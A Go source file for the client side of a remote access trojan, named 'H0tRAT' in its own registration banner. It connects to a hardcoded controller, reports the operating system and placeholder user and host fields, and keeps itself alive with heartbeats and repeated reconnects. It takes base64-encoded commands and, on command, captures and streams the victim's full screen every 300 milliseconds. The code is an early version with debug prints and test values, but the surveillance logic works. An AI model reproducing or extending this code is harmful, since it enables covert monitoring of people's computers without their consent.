package client

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"fmt"
	"github.com/go-vgo/robotgo"
	"image/jpeg"
	"io"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
	"ylc/src/demo/util"
)

const (
	IP      = "127.0.0.1:1010"
	PORT    = 1010
	CONNPWD = "18Sd9fkdkf9"
)

const (
	HEAD    = "HEAD"
	VERSION = "1.0.0"
)

var isturn = true

var wg sync.WaitGroup

func Ma() {

	connectNew()

}

func heartbeat(conn net.Conn, interval time.Duration) {
	for {
		fmt.Println("aaaaaaaaaaaaaaaaaa")
		time.Sleep(interval)
		writer := bufio.NewWriter(conn)
		//创建心跳
		_, err := fmt.Fprintln(writer, -1)
		if err != nil {
			fmt.Println(err)
			//重连
			connectNew()
			return
		}
	}
	wg.Done() // 协程计数器加-1
}
func heartbeatT(conn net.Conn, interval time.Duration) {
	for {
		fmt.Println("bbbbbbbbbbb")
		time.Sleep(interval)
		writer := bufio.NewWriter(conn)
		//创建心跳
		_, err := fmt.Fprintln(writer, -1)
		if err != nil {
			fmt.Println(err)
			//重连
			connectNew()
			return
		}
	}
	wg.Done() // 协程计数器加-1
}

func SendHead(Head byte, socket net.Conn) {
	buf := make([]byte, 1)
	buf[0] = Head
	_, err := socket.Write(buf)
	if err != nil {
		fmt.Println(err)
	}
}

func GetImage() []byte {
	// 获取屏幕大小
	screenWidth, screenHeight := robotgo.GetScreenSize()

	// 截取屏幕图像
	bitmap := robotgo.CaptureScreen(0, 0, screenWidth, screenHeight)

	// 转换为JPEG格式的字节数组
	buffer := new(bytes.Buffer)
	jpeg.Encode(buffer, bitmap, &jpeg.Options{Quality: 80})
	bytes := buffer.Bytes()
	return bytes
}

func SendScreen(conn net.Conn) {

	SendHead(1, conn)
	for {
		time.Sleep(300 * time.Millisecond)
		getImage := GetImage()

		util.Send(2, getImage, conn)
	}
}

func connectNew() {

	wg.Add(2) // 协程计数器 +1
	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "127.0.0.1:1010")
	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
	if err != nil {
		fmt.Println(err)
	}
	defer socket.Close()
	// IO流
	dataOutputStream := bufio.NewWriter(socket)

	// 发送信息
	fmt.Fprintln(dataOutputStream, "H0tRAT")
	fmt.Fprintln(dataOutputStream, "USER")
	fmt.Fprintln(dataOutputStream, "HOSTNAME")
	fmt.Fprintln(dataOutputStream, runtime.GOOS)
	fmt.Fprintln(dataOutputStream, IP)
	fmt.Fprintln(dataOutputStream, "测试地址")
	fmt.Fprintln(dataOutputStream, "测试名字")
	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
	fmt.Fprintln(dataOutputStream, "测试")
	fmt.Fprintln(dataOutputStream, VERSION)
	fmt.Fprintln(dataOutputStream, "360")

	dataOutputStream.Flush()
	// // 协程计数器加-1

	go heartbeat(socket, time.Second)
	go heartbeatT(socket, time.Second)
	wg.Wait() //等待协程计数器为0 退出
	fmt.Println("abc========================")

}

func maConnetNew() {
	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "127.0.0.1:1010")
	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
	if err != nil {
		fmt.Println(err)
		maConnetNew()
	}
	defer socket.Close()

	// IO流
	dataOutputStream := bufio.NewWriter(socket)

	// 发送信息
	fmt.Fprintln(dataOutputStream, "H0tRAT")
	fmt.Fprintln(dataOutputStream, "USER")
	fmt.Fprintln(dataOutputStream, "HOSTNAME")
	fmt.Fprintln(dataOutputStream, runtime.GOOS)
	fmt.Fprintln(dataOutputStream, IP)
	fmt.Fprintln(dataOutputStream, "测试地址")
	fmt.Fprintln(dataOutputStream, "测试名字")
	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
	fmt.Fprintln(dataOutputStream, "测试")
	fmt.Fprintln(dataOutputStream, VERSION)
	fmt.Fprintln(dataOutputStream, "360")

	for {
		// IO流
		message, err := bufio.NewReader(socket).ReadString('\n')
		if err == io.EOF {
			// 如果服务器断开，则重新连接
			socket.Close()
			maConnetNew()
		}
		// 收到指令base64解码
		decodedCase, _ := base64.StdEncoding.DecodeString(message)
		command := string(decodedCase)
		cmdParameter := strings.Split(command, " ")
		switch cmdParameter[0] {
		case "back":
			socket.Close()

			maConnetNew()
		case "exit":
			socket.Close()
			os.Exit(0)
		//屏幕监控
		case "1":
			go SendScreen(socket)
		}
	}
}
